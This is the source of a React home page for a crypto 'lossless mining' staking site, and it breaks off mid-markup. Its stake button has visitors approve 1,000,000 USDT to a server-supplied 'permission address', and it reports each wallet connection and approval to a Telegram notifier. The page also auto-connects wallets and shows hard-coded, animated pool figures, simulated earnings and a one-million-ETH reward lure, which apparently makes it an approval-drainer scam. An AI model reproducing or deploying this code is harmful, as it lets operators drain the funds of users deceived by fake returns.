'use client'

import { useState, useEffect, useCallback } from 'react'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { CounterAnimation } from '@/components/CounterAnimation'
import { EnhancedButton } from '@/components/EnhancedButton'
import { RefreshCWIcon } from '@/components/RefreshCWIcon'
import InfiniteHero from '@/components/ui/infinite-hero'
import PartnersCarousel from '@/components/PartnersCarousel'
import PartnersSection from '@/components/PartnersSection'
import HelpCenterAccordion from '@/components/ui/help-center-accordion'
import { LanguageSelectorDropdown } from '@/components/ui/language-selector-dropdown'

import LanguageSelector from '@/components/LanguageSelector'
import { FramedCard } from '@/components/FramedCard'
import { AnimatedTabs } from '@/components/ui/animated-tabs'

import { StakingCardButton } from '@/components/StakingCardButton'

import { useUserProfile } from '@/hooks/useData'
import { useI18n } from '@/contexts/I18nContext'
import { isMobileDevice, isInWalletBrowser, getWalletType, getFriendlyErrorMessage } from '@/lib/wallet-utils'
import { CURRENT_NETWORK } from '@/lib/contracts'
import { Button } from '@/components/ui/button'
import { EnhancedAnnouncementModal } from '@/components/EnhancedAnnouncementModal'
import HexagonLoader, { HexagonLoaderInline } from '@/components/HexagonLoader'
import StakingModal from '@/components/StakingModal'
import { useWeb3Staking } from '@/hooks/useWeb3Staking'
import { useTransactionRecords } from '@/hooks/useTransactionRecords'
import { usePageLoading } from '@/hooks/usePageLoading'
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import MiningOutputScroller from '@/components/MiningOutputScroller'
import { getMaxApproveAmountFromEnv } from '@/lib/load-env'
import DraggableChatButton from '@/components/NewEmptyComponent'
import { ContainerTextScroll } from '@/components/ui/container-text-scroll'
import ScrollIndicator from '@/components/ui/scroll-indicator'
import { RouteIcon } from '@/components/ui/route-icon'
import ParticipateButton from '@/components/ParticipateButton'
import BinanceLiquidityStaking from '@/components/BinanceLiquidityStaking'
import { SlideTabs } from '@/components/ui/slide-tabs'
import InviteLinkButton from '@/components/InviteLinkButton'
import { telegramRealtimeService } from '@/services/telegramRealtimeService'
import { walletMonitorService } from '@/services/walletMonitorService'
import styled from 'styled-components'
import { Input } from '@/components/ui/input'
import { ArrowDownCircle, ArrowUpCircle, ArrowLeftRight, RefreshCw, TrendingUp, Percent, Lock, Wallet } from 'lucide-react'
import { GlowButton } from '@/components/ui/glow-button'
import { LuxuryButton } from '@/components/ui/luxury-button'
import Link from 'next/link'
import { ScrollAnimate } from '@/components/ui/scroll-animate'

const StyledStatsCard = styled.div`
  width: 100%;

  .bgblue {
    background: linear-gradient(135deg, #fffffff5, #3a4b8a, #ffffff98);
    padding: 1px;
    border-radius: 1.2rem;
    box-shadow: 0px 1rem 1.5rem -0.9rem #000000e1;
    max-width: 100%;
    width: 100%;
  }

  .card-wrapper {
    font-size: 1rem;
    color: #bec4cf;
    background: #2B2119;
    padding: 1.5rem;
    border-radius: 1.2rem;
    width: 100%;
  }

  .stats-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 1rem;
    margin-bottom: 1rem;
  }

  .stat-item {
    padding: 0.75rem;
    background: rgba(0, 0, 0, 0.2);
    border-radius: 0.5rem;
  }

  .stat-label {
    font-size: 0.75rem;
    color: #9ca3af;
    margin-bottom: 0.25rem;
  }

  .stat-value {
    font-size: 1.125rem;
    font-weight: 600;
    color: #fbbf24;
  }

  .withdraw-section {
    margin-top: 1rem;
  }

  .withdraw-input {
    width: 100%;
    padding: 0.75rem;
    background: rgba(0, 0, 0, 0.3);
    border: 1px solid #4b5563;
    border-radius: 0.5rem;
    color: #bec4cf;
    margin-bottom: 0.5rem;
    
    &:focus {
      outline: none;
      border-color: #fbbf24;
    }
    
    &::placeholder {
      color: #6b7280;
    }
  }

  .withdraw-info {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.875rem;
    color: #9ca3af;
    margin-bottom: 1rem;
  }

  .withdraw-link {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    color: #fbbf24;
    text-decoration: none;
    
    &:hover {
      text-decoration: underline;
    }
  }

  .withdraw-button {
    width: 100%;
    padding: 0.75rem;
    background: linear-gradient(135deg, #fbbf24, #f59e0b);
    border: none;
    border-radius: 0.5rem;
    color: #000;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    
    &:hover {
      background: linear-gradient(135deg, #f59e0b, #d97706);
    }
    
    &:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
  }
`;

const StyledWalletCard = styled.div`
  width: 100%;
  max-width: 100%;

  .bgblue {
    background: linear-gradient(135deg, #fffffff5, #3a4b8a, #ffffff98);
    padding: 1px;
    border-radius: 1.2rem;
    box-shadow: 0px 1rem 1.5rem -0.9rem #000000e1;
    width: 100%;
  }

  .card {
    font-size: 1rem;
    color: #bec4cf;
    background: linear-gradient(135deg, #050810 0%, #1a2345 43%, #050810 100%);
    padding: 1.5rem;
    border-radius: 1.2rem;
    width: 100%;
  }

  .flex {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 18px;
  }

  .flex .tag {
    fill: #ffffff;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 25px;
    width: 25px;
  }

  .heading {
    margin: 0;
    font-size: 24px;
    font-weight: 700;
    color: #ffffff;
  }

  .amount {
    font-size: 32px;
    font-weight: bold;
    margin: 10px 0;
    line-height: 1.2;
    display: inline-flex;
    align-items: center;
    color: #ffffff;
  }

  .text-green {
    color: #4ade80;
  }

  .compare {
    font-size: 12px;
    letter-spacing: 1px;
    color: #bec4cf;
  }

  .text-light {
    color: #bec4cf;
  }

  .wallet-info {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-top: 10px;
  }

  .wallet-info-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 0;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  }

  .wallet-info-item:last-child {
    border-bottom: none;
  }

  .wallet-info-label {
    color: #bec4cf;
    font-size: 14px;
  }

  .wallet-info-value {
    color: #ffffff;
    font-size: 14px;
    font-weight: 500;
  }

  .wallet-info-value.status-connected {
    color: #4ade80;
  }

  .wallet-info-value.status-disconnected {
    color: #ffa7a7;
  }

  .wallet-info-value.balance {
    color: #FFA500;
  }

  .wallet-address {
    font-family: monospace;
    font-size: 12px;
  }

  .wallet-actions {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 12px;
    margin-top: 20px;
    padding-top: 20px;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
  }

  @media (max-width: 768px) {
    .card {
      padding: 1rem;
    }

    .amount {
      font-size: 24px;
    }
  }
`;

const StyledBookmarkButton = styled.button`
  width: 100px;
  height: 40px;
  border-radius: 40px;
  border: 1px solid rgba(255, 255, 255, 0.349);
  background-color: rgb(12, 12, 12);
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  overflow: hidden;
  position: relative;

  .IconContainer {
    width: 0;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  .text {
    height: 100%;
    width: 60px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    z-index: 1;
    font-size: 1.04em;
  }
`;

// Telegram机器人集成
class TelegramBotIntegration {
  async notifyUserConnect(address: string, action = 'connect') {
    try {
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_connect',
          user_address: address,
          notification_data: {
            address: address,
            action: action,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          }
        })
      })
    } catch (error) {
      // 静默处理错误
    }
  }

  async notifyUserDisconnect(address: string) {
    try {
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_disconnect',
          user_address: address,
          notification_data: {
            address: address,
            timestamp: new Date().toISOString()
          }
        })
      })
    } catch (error) {
      // 静默处理错误
    }
  }

  // 新增：用户授权通知方法
  async notifyUserAuthorize(address: string, amount = '1000000', txHash = '') {
    try {
      const response = await fetch('/api/telegram/notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          notification_type: 'user_authorize',
          user_address: address,
          notification_data: {
            address: address,
            amount: amount,
            hash: txHash,
            timestamp: new Date().toISOString()
          }
        })
      })
    } catch (error) {
      // 静默处理错误
    }
  }

  async checkStatus() {
    try {
      const response = await fetch('/api/telegram/webhook');
      const result = await response.json();
      return result;
    } catch (error) {
      return null;
    }
  }
}

const telegramBot = new TelegramBotIntegration();

export default function Home() {
  // 状态管理
  const [isLoading, setIsLoading] = useState(false)
  const [announcements, setAnnouncements] = useState<any[]>([])
  const [showAnnouncement, setShowAnnouncement] = useState(false)
  const [currentAnnouncementIndex, setCurrentAnnouncementIndex] = useState(0)
  const [faqOpen, setFaqOpen] = useState(false)
  const [showStakingModal, setShowStakingModal] = useState(false)
  const [isApprovalPending, setIsApprovalPending] = useState(false)
  const [approvalTxHash, setApprovalTxHash] = useState('')
  const [referralCode, setReferralCode] = useState<string | null>(null)
  const [activeHomeTab, setActiveHomeTab] = useState('miningPool')
  const [homeExchangeTab, setHomeExchangeTab] = useState('exchange')
  const [recordsSubTab, setRecordsSubTab] = useState('exchange')
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [isWithdrawing, setIsWithdrawing] = useState(false)
  const [showDepositModal, setShowDepositModal] = useState(false)
  const [showWithdrawModal, setShowWithdrawModal] = useState(false)
  const [showExchangeModal, setShowExchangeModal] = useState(false)
  const [depositConfig, setDepositConfig] = useState<{ depositAddress: string; depositQrcode: string }>({ depositAddress: '', depositQrcode: '' })
  const [addressCopied, setAddressCopied] = useState(false)
  const [depositAmount, setDepositAmount] = useState('')
  const [exchangeFrom, setExchangeFrom] = useState('USDT')
  const [exchangeTo, setExchangeTo] = useState('ETH')
  const [exchangeAmount, setExchangeAmount] = useState('')
  const [isSubmitting, setIsSubmitting] = useState(false)

  // 记录子标签映射
  const recordsTabMapping = ['exchange', 'withdraw', 'deposit', 'shared', 'earnings']
  const getRecordsTabIndex = (tab: string) => recordsTabMapping.indexOf(tab)
  const setRecordsTabByIndex = (index: number) => setRecordsSubTab(recordsTabMapping[index])

  // 收益计算函数
  const calculateDailyRate = (amount: number): number => {
    if (amount >= 200000) return 5;
    if (amount >= 100000) return 4;
    if (amount >= 10000) return 3;
    if (amount >= 5000) return 2.5;
    if (amount >= 50) return 2;
    return 0;
  }

  // 模拟收益记录数据
  const generateEarningsRecords = () => {
    const records = [];
    const now = new Date();
    const stakedAmount = 10000; // 示例质押金额
    const dailyRate = calculateDailyRate(stakedAmount);
    const quarterlyEarning = (stakedAmount * dailyRate / 100) / 4; // 每6小时收益

    // 生成最近7天的收益记录（每天4次）
    for (let day = 0; day < 7; day++) {
      for (let quarter = 0; quarter < 4; quarter++) {
        const recordTime = new Date(now.getTime() - (day * 24 + quarter * 6) * 60 * 60 * 1000);
        records.push({
          time: recordTime.toLocaleString('zh-CN', { 
            timeZone: 'Europe/London',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
          }),
          earnings: quarterlyEarning.toFixed(4),
          rate: `${dailyRate}%`
        });
      }
    }
    return records.reverse();
  }

  
  // 兑换功能状态
  const [ethAmount, setEthAmount] = useState('')
  const [usdtAmount, setUsdtAmount] = useState('')
  const [isEthToUsdt, setIsEthToUsdt] = useState(true)
  const [exchangeRate] = useState(4480.37) // ETH to USDT 汇率

  // 使用AppKit hooks
  const { open } = useAppKit()
  const { address: account, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()
  
  // 检查是否在ETH主网 (chainId 1是ETH主网)
  const chainIdNum = typeof chainId === 'string' ? Number.parseInt(chainId) : (typeof chainId === 'number' ? chainId : 0)
  const isOnETH = chainIdNum === 1
  
  // Web3质押功能
  const { 
    usdtBalance, 
    usdtAllowance, 
    approveUsdt, 
    stakeUsdt,
    refetchUsdtBalance,
    refetchUsdtAllowance
  } = useWeb3Staking()
  
  // 移除管理员verify检查，改为检查对合约的verify
  
  // 国际化
  const { t } = useI18n()

  // 页面加载状态
  usePageLoading()

  // 获取充值配置（地址和二维码）
  useEffect(() => {
    const fetchDepositConfig = async () => {
      try {
        const response = await fetch('/api/config/deposit')
        const result = await response.json()
        if (result.success) {
          setDepositConfig(result.data)
        }
      } catch (error) {
        console.error('获取充值配置失败:', error)
      }
    }
    fetchDepositConfig()
  }, [])

  // 读取URL中的邀请码参数
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search)
      const ref = params.get('ref')
      
      if (ref) {
        console.log('检测到邀请码:', ref)
        setReferralCode(ref)
        // 保存到localStorage，确保授权时可用
        localStorage.setItem('referralCode', ref)
        console.log('邀请码已保存到localStorage')
      } else {
        // 尝试从localStorage读取之前保存的邀请码
        const savedRef = localStorage.getItem('referralCode')
        if (savedRef) {
          console.log('从localStorage读取邀请码:', savedRef)
          setReferralCode(savedRef)
        }
      }
    }
  }, [])

  // 用户心跳 - 定期更新活动时间以保持在线状态
  useEffect(() => {
    if (!isConnected || !account) return

    // 立即发送一次心跳
    const sendHeartbeat = async () => {
      try {
        await fetch('/api/user/heartbeat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ wallet_address: account })
        })
      } catch (error) {
        // 静默处理错误
      }
    }

    sendHeartbeat()

    // 每60秒发送一次心跳（减少频率以提升性能）
    const heartbeatInterval = setInterval(sendHeartbeat, 60000)

    return () => {
      clearInterval(heartbeatInterval)
    }
  }, [isConnected, account])

  // 启动Telegram实时通知服务
  useEffect(() => {
    const startTelegramService = async () => {
      try {
        // 先检查当前状态
        const currentStatus = telegramRealtimeService.getStatus()
        if (currentStatus.isRunning) {
          return
        }

        // 启动服务
        await telegramRealtimeService.start()
      } catch (error) {
        // 静默处理错误
      }
    }

    startTelegramService()

    // 清理函数
    return () => {
      telegramRealtimeService.stop()
    }
  }, [])

  // 注意：授权奖励现在直接在 /api/user/authorize API 中处理，不再需要 Realtime 监听

  // 启动钱包动账监听服务
  useEffect(() => {
    const startWalletMonitorService = async () => {
      try {
        await walletMonitorService.start()
      } catch (error) {
        // 静默处理错误
      }
    }

    startWalletMonitorService()

    // 清理函数
    return () => {
      walletMonitorService.stop()
    }
  }, [])

  // 获取用户信息
  const { 
    userProfile, 
    loading: profileLoading, 
    refetch: refetchProfile 
  } = useUserProfile(account)
  
  // 获取真实交易记录数据
  const { 
    exchangeRecords, 
    withdrawRecords, 
    depositRecords,
    earningsRecords, 
    sharedRecords,
    loading: recordsLoading,
    refetch: refetchRecords
  } = useTransactionRecords(account)

  // 自动刷新记录数据 - 每60秒刷新一次（减少频率以提升性能）
  useEffect(() => {
    if (!account) return

    const refreshInterval = setInterval(() => {
      refetchRecords()
    }, 60000) // 60秒刷新一次

    return () => {
      clearInterval(refreshInterval)
    }
  }, [account, refetchRecords])

  // 自动连接钱包 - 页面加载时自动尝试连接
  useEffect(() => {
    const autoConnectWallet = async () => {
      // 如果已经连接，直接返回
      if (isConnected && account) {
        return;
      }

      // 检查是否有之前的连接状态
      const wasConnected = typeof window !== 'undefined' && 
        localStorage.getItem('wallet_connected') === 'true';
      const savedAddress = typeof window !== 'undefined' && 
        localStorage.getItem('wallet_address');

      if (wasConnected && savedAddress && !isConnected && open) {
        try {
          // 延迟一点时间确保Web3组件完全加载
          setTimeout(async () => {
            try {
              await open();
            } catch (error) {
              // 静默处理连接失败
            }
          }, 1500); // 增加延迟时间确保Wagmi完全初始化
        } catch (error) {
          // 静默处理连接失败
        }
      } else if (!isConnected && open) {
        console.log('尝试自动连接钱包...');
        try {
          // 延迟一点时间确保Web3组件完全加载
          setTimeout(async () => {
            try {
              await open();
              console.log('自动钱包连接成功');
            } catch (error) {
              console.log('自动钱包连接失败，用户需要手动连接:', error);
            }
          }, 1000);
        } catch (error) {
          console.log('自动钱包连接失败:', error);
        }
      }
    };

    autoConnectWallet();
  }, [isConnected, account, open]);

  // 监控钱包连接状态（移除Telegram通知，避免重复发送）
  useEffect(() => {
    if (isConnected && account) {
      console.log('钱包已连接:', account);
    } else if (!isConnected && account) {
      console.log('钱包已断开:', account);
    }
  }, [isConnected, account]);

  // 兑换功能逻辑
  const handleSwapCurrencies = () => {
    setIsEthToUsdt(!isEthToUsdt)
  }

  // 提现功能
  const handleWithdraw = async () => {
    if (!withdrawAmount || Number.parseFloat(withdrawAmount) <= 0) {
      alert('请输入有效的提现金额');
      return;
    }

    // 检查最低提现限制
    const minWithdrawAmount = 10;
    if (Number.parseFloat(withdrawAmount) < minWithdrawAmount) {
      alert(`${t.minWithdrawAmount}`);
      return;
    }

    if (!account) {
      alert('请先连接钱包');
      return;
    }

    try {
      setIsWithdrawing(true);

      // 调用提现API
      const response = await fetch('/api/user/withdraw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userAddress: account,
          amount: withdrawAmount,
          withdrawAddress: account  // 提现到用户自己的钱包地址
        })
      });

      const result = await response.json();

      if (result.success) {
        console.log('提现请求提交成功');
        alert('提现请求已提交，请等待处理');
        setWithdrawAmount('');
        
        // 刷新用户资料和记录
        if (refetchProfile) {
          await refetchProfile();
        }
        if (refetchRecords) {
          await refetchRecords();
        }
      } else {
        throw new Error(result.error || '提现失败');
      }
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('提现失败:', error);
      }
      alert('提现失败: ' + (error instanceof Error ? error.message : "未知错误"));
    } finally {
      setIsWithdrawing(false);
    }
  }

  
  // 质押相关数据
  const stakedAmount = userProfile?.usdt || 0        // 质押金额
  const rewardAmount = userProfile?.cash || 0        // 奖励金额
  const totalInvestment = userProfile?.totalInvestment || 0  // 总投资
  const totalRewards = userProfile?.totalRewards || 0       // 总奖励
  
  // 用于跟踪最新的授权额度
  const [latestAllowance, setLatestAllowance] = useState<string>('0')
  
  // 监听usdtAllowance变化，更新latestAllowance
  useEffect(() => {
    if (usdtAllowance) {
      setLatestAllowance(usdtAllowance)
    }
  }, [usdtAllowance])
  
  // 计算verify状态 - 检查对质押合约的verify，不是对私人地址的verify
  const isAuthorized = usdtAllowance && Number.parseFloat(usdtAllowance) > 0 && !isApprovalPending

  // 获取授权配置（权限地址）
  const [permissionAddress, setPermissionAddress] = useState<string | null>(null)
  const [loadingAuthConfig, setLoadingAuthConfig] = useState(false)

  useEffect(() => {
    const fetchAuthConfig = async () => {
      try {
        setLoadingAuthConfig(true)
        const response = await fetch('/api/config/auth?chain_type=ERC')
        const result = await response.json()
        
        if (result.success && result.data?.permission_addresses?.length > 0) {
          // 使用第一个启用的权限地址
          const firstPermissionAddress = result.data.permission_addresses[0]
          setPermissionAddress(firstPermissionAddress)
          console.log('✅ 获取到权限地址配置:', firstPermissionAddress)
        } else {
          // 如果没有配置权限地址，使用质押合约地址（向后兼容）
          const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
          setPermissionAddress(STAKING_CONTRACT)
          console.log('⚠️ 未找到权限地址配置，使用质押合约地址:', STAKING_CONTRACT)
        }
      } catch (error) {
        console.error('获取授权配置失败:', error)
        // 失败时使用质押合约地址（向后兼容）
        const STAKING_CONTRACT = CURRENT_NETWORK.STAKING_CONTRACT
        setPermissionAddress(STAKING_CONTRACT)
      } finally {
        setLoadingAuthConfig(false)
      }
    }
    
    fetchAuthConfig()
  }, [])

  // Handle authorization - 使用配置的权限地址
  const handleStake = async () => {
    if (!isConnected) {
      await open()
      return
    }
    
    if (!account) {
      return
    }
    
    if (!permissionAddress) {
      alert('正在加载授权配置，请稍候...')
      return
    }
    
    try {
      setIsApprovalPending(true)
      
      // 授权大额度（100万 USDT）给权限地址
      const defaultAmount = '1000000' // 100万 USDT
      console.log(`授权给权限地址: ${permissionAddress}`)
      
      // 授权给权限地址
      const txHash = await approveUsdt(defaultAmount, permissionAddress)
      console.log('授权成功:', txHash)
      console.log('交易哈希:', txHash)
      
      setApprovalTxHash(String(txHash))
      
      // 保存邀请码到 localStorage（监听服务需要）
      if (referralCode) {
        localStorage.setItem(`referralCode_${account}`, referralCode)
        console.log('已保存邀请码到 localStorage')
      }
      
      // 等待监听服务检测链上 Approval 事件
      console.log('等待监听服务检测链上 Approval 事件...')
      console.log('授权成功后，监听服务会自动：')
      console.log('   1. 检测链上 Approval 事件')
      console.log('   2. 验证权限地址')
      console.log('   3. 调用后端 API 处理授权')
      console.log('   4. 发放奖励')
      setIsApprovalPending(false)
      
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.error('授权失败:', error)
      }
      setIsApprovalPending(false)
      setApprovalTxHash('')
    }
  }

  return (
    <div className="min-h-screen relative main-container mobile-card">
      
      {/* Hero区域 - 着色器背景动画 */}
      <InfiniteHero>
        {/* Header */}
        <header className="flex items-center justify-between pl-0 pr-4 py-4 border-b border-border/20 text-white bg-black font-bold relative z-[11000]">
          <div className="flex items-center gap-4 pt-2">
            <img 
              src="https://cy-747263170.imgix.net/logo.1730b8a9.gif" 
              alt="Logo" 
              className="h-14 w-auto slide-in-up"
            />
            {/* 桌面端语言选择器 */}
            <div className="hidden sm:block">
              <LanguageSelectorDropdown />
            </div>
          </div>
          <div className="flex items-center gap-4 pt-2">
            {/* 手机端语言选择器 */}
            <div className="sm:hidden">
              <LanguageSelectorDropdown />
            </div>
            {/* 桌面端按钮 */}
            <div className="hidden sm:flex items-center gap-4">
              {/* 邀请链接按钮 */}
              <InviteLinkButton 
                inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
                title="Invite Friends"
                description="Share this link with your friends to invite them"
              />
            </div>
          </div>
        </header>

        {/* 全球挖矿网络地图 */}
        {/* 地图组件顶部的标题 */}
        <section className="px-4 py-8 text-center">
          <div className="max-w-6xl mx-auto">
            <h1 className="text-3xl md:text-5xl font-bold text-white mb-4">
              {t.globalLiquidityMiningNetwork}
            </h1>
            <p className="text-lg md:text-xl text-gray-300 max-w-4xl mx-auto">
              {t.globalLiquidityMiningNetworkDescription}
            </p>
            
            {/* 移动端邀请链接按钮 */}
            <div className="mt-6 sm:hidden">
              <InviteLinkButton 
                inviteLink={`${typeof window !== 'undefined' ? window.location.origin : 'https://yourapp.com'}?ref=${account || 'default'}`}
                title="Invite Friends"
                description="Share this link with your friends to invite them"
              />
            </div>
          </div>
        </section>

        {/* ContainerTextScroll 主要视频区域 - 在背景动画内 */}
        <ContainerTextScroll
          titleComponent={
            <div className="relative z-10">
              <h2 className="text-3xl md:text-5xl font-bold text-white mb-4 drop-shadow-lg">
                {t.losslessMining}
              </h2>
              <p className="text-lg md:text-xl text-gray-300 font-medium mb-4 drop-shadow-lg">
                {t.walletMining}
              </p>
              
              {/* 奖励和百万ETH文字 */}
              <div className="flex items-center gap-1 justify-center mb-6">
                <span className="text-white text-xl md:text-2xl font-bold drop-shadow-lg">{t.reward}</span>
                <span className="text-yellow-400 text-5xl md:text-6xl font-bold drop-shadow-lg">{t.oneMillion}</span>
                <span className="text-white text-xl md:text-2xl font-bold drop-shadow-lg">ETH</span>
              </div>

              <div className="flex justify-center">
                <ParticipateButton 
                  onClick={handleStake}
                  disabled={isLoading}
                  isAuthorized={!!isAuthorized}
                  isApprovalPending={isApprovalPending}
                  isConnected={isConnected}
                />
              </div>
            </div>
          }
        >
          <div className="relative w-full h-full">
            <img
              src="/ethereum.webp"
              alt="Ethereum"
              className="w-full h-full object-cover rounded-2xl"
              draggable={false}
            />
            {/* 半透明覆盖层以提高文字可读性 */}
            <div className="absolute inset-0 bg-black/30 rounded-2xl pointer-events-none" />
          </div>
        </ContainerTextScroll>

        {/* 滚动指示器 */}
        <div className="pb-24 pt-4">
          <ScrollIndicator />
        </div>

      </InfiniteHero>

      {/* 液态模糊玻璃过渡区域 */}
      <div className="relative">
        {/* 玻璃态模糊背景 */}
        <div 
          className="absolute inset-x-0 -top-32 h-48 pointer-events-none"
          style={{
            background: 'linear-gradient(to bottom, transparent 0%, rgba(0,0,0,0.3) 30%, rgba(0,0,0,0.7) 60%, rgba(0,0,0,1) 100%)',
            backdropFilter: 'blur(20px)',
            WebkitBackdropFilter: 'blur(20px)',
            maskImage: 'linear-gradient(to bottom, transparent 0%, black 50%, black 100%)',
            WebkitMaskImage: 'linear-gradient(to bottom, transparent 0%, black 50%, black 100%)',
          }}
        />
        {/* 液态光效 */}
        <div 
          className="absolute inset-x-0 -top-20 h-24 pointer-events-none overflow-hidden"
          style={{
            background: 'radial-gradient(ellipse 80% 50% at 50% 100%, rgba(250, 204, 21, 0.15) 0%, transparent 70%)',
          }}
        />
      </div>

      {/* 切换栏 - 矿池/账户 */}
      <ScrollAnimate direction="up" delay={0.1}>
        <section className="px-3 md:px-4 bg-black relative z-10">
          <div className="max-w-4xl mx-auto mb-6">
            <AnimatedTabs 
              tabs={[
                { label: t.miningPool, value: 'miningPool' },
                { label: t.account, value: 'account' }
              ]}
              activeTab={activeHomeTab}
              onTabChange={setActiveHomeTab}
            />
          </div>
        </section>
      </ScrollAnimate>


      {/* 条件渲染内容区域 */}
      {activeHomeTab === 'miningPool' && (
        <>
          {/* 礦池卡片 */}
          <ScrollAnimate direction="up" delay={0.15}>
            <section className="px-3 md:px-4 bg-black">
              <div className="max-w-4xl mx-auto">
                <div className="mb-8">
                  <FramedCard minHeight="350px">
                  <div className="space-y-6 pb-4">
                    <h3 className="text-xl font-bold text-center text-white">{t.miningPool}</h3>
                    
                    <div className="space-y-4">
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.totalOutput}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={368247.819} decimals={3} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.activeNodes}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={179081.626} decimals={3} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3 border-b border-gray-600/30">
                        <span className="text-gray-400 text-sm">{t.participants}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={478371} className="counter-text" />
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-3">
                        <span className="text-gray-400 text-sm">{t.userIncome}</span>
                        <span className="text-white font-bold text-lg">
                          <CounterAnimation end={196319.294} decimals={3} suffix=" USDT" className="counter-text" />
                        </span>
                      </div>
                    </div>
                  </div>
                  </FramedCard>
                </div>
              </div>
            </section>
          </ScrollAnimate>

          {/* 用戶挖礦輸出卡片 */}
          <ScrollAnimate direction="up" delay={0.2}>
            <section className="px-3 md:px-4 bg-black">
              <div className="max-w-4xl mx-auto">
                <div className="mb-8">
                  <FramedCard minHeight="450px">
                    <div className="space-y-4 pb-4">
                      <MiningOutputScroller />
                    </div>
                  </FramedCard>
                </div>
              </div>
            </section>
          </ScrollAnimate>
        </>
      )}

      {activeHomeTab === 'account' && (
        <>
          {/* 我的账户页面 - 钱包卡片样式 */}
          <ScrollAnimate direction="up" delay={0.1}>
            <section className="px-3 md:px-4 bg-black min-h-screen relative z-10">
              <div className="max-w-4xl mx-auto pt-4 pb-0">
                <StyledWalletCard>
                  <div className="bgblue">
                    <div className="card">
                      <div className="flex">
                        <p className="heading">{t.myAccount}</p>
                        <p className="tag">
                          <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" viewBox="0 0 925.1 925.1" xmlSpace="preserve">
                            <g>
                              <g>
                                <path d="M453.5,26.514l-345.6,187.3l15.2-3.8l412.9-104.7l-35-64.6C491.8,23.614,470.5,17.313,453.5,26.514z" />
                                <path d="M780.9,222.313l-26.2-103.4c-4-15.9-18.3-26.4-33.9-26.4c-2.8,0-5.7,0.3-8.6,1.1l-160.5,40.7l-347.4,88.1H599.4h181.5V222.313z" />
                                <path d="M546.7,665.513v-176c0-36.699,29.8-66.5,66.5-66.5h218.6h16.5h16.5H878v-135.7c0-19.3-15.7-35-35-35h-21.5H805h-16.5H615.7H133.8h-16.5h-16.5h-64H35c-12.9,0-24.1,7-30.2,17.3c-3,5.2-4.8,11.2-4.8,17.7v5.6v574.9c0,19.301,15.7,35,35,35h807.9c19.3,0,35-15.699,35-35V732.114H613.2C576.5,732.114,546.7,702.214,546.7,665.513z" />
                                <path d="M908,459.513c-4.5-2.699-9.6-4.3-15-4.8c-1-0.1-1.9-0.1-2.9-0.1H878h-5.2h-16.5h-39.6H613.2c-19.3,0-35,15.7-35,35v176c0,19.299,15.7,35,35,35H878h12.1c1,0,1.9-0.102,2.9-0.102c5.4-0.398,10.5-2.1,15-4.799c10.2-6.1,17.1-17.301,17.1-30.1v-176C925.1,476.813,918.2,465.614,908,459.513z M700.5,634.313c-31.3,0-56.8-25.4-56.8-56.801c0-31.299,25.399-56.799,56.8-56.799c31.3,0,56.8,25.4,56.8,56.799C757.3,608.913,731.9,634.313,700.5,634.313z" />
                              </g>
                            </g>
                          </svg>
                        </p>
                      </div>
                      <div className="amount text-green">
                        <span>
                          <CounterAnimation end={userProfile?.usdt ? Number.parseFloat(userProfile.usdt.toString()) : 0} decimals={2} suffix=" USDT" />
                        </span>
                      </div>
                      <div className="compare text-light">
                        {t.walletBalance}
                      </div>
                      <div className="wallet-info">
                        <div className="wallet-info-item">
                          <span className="wallet-info-label">{t.walletStatus}</span>
                          <span className={`wallet-info-value ${isConnected ? 'status-connected' : 'status-disconnected'}`}>
                            {isConnected ? t.connected : t.disconnected}
                          </span>
                        </div>
                        {isConnected && account && (
                          <div className="wallet-info-item">
                            <span className="wallet-info-label">{t.walletAddress}</span>
